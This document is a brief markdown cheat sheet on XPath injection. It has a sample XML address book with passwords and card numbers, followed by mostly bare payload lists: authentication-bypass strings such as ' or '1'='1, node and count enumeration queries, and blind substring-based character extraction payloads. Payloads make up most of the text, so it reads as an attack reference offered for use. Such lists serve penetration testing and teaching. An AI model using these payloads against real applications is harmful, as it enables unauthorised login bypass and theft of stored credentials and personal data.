# XPATH


## Injecting into XPath


XML exemple:

```xml
<addressBook>
	<address>
		<firstName>William</firstName>
		<surname>Gates</surname>
		<password>MSRocks!</password>
		<email>billyg@microsoft.com</email>
		<ccard>5130 8190 3282 3515</ccard>
	</address>
	<address>
		<firstName>Chris</firstName>
		<surname>Dawes</surname>
		<password>secret</password>
		<email>cdawes@craftnet.de</email>
		<ccard>3981 2491 3242 3121</ccard>
	</address>
	<address>
		<firstName>James</firstName>
		<surname>Hunter</surname>
		<password>letmein</password>
		<email>james.hunter@pookmail.com</email>
		<ccard>8113 5320 8014 3313</ccard>
	</address>
```

## XPATH injection

### Classic Exploitation

```txt
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
```

### Blind Exploitation

1. Size of a string

and string-length(account)=SIZE_INT

2. Extract a character

```txt
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```


An XPath query to retrieve all e-mail addresses would look like this: `//address/email/text()`

A query to return all the details of the user Dawes would look like this: `//address[surname/text()='Dawes']`


## Blind XPATH Injection:

```txt
' or substring(name(parent::*[position()=1]),1,1)='a
' or substring(name(parent::*[position()=1]),2,1)='a
' or substring(name(parent::*[position()=1]),2,1)='b
' or substring(name(parent::*[position()=1]),2,1)='c
' or substring(name(parent::*[position()=1]),2,1)='d
//address[position()=3]/child::node()[position()=4]/text()
//address[position()=3]/child::node()[position()=6]/text()
```

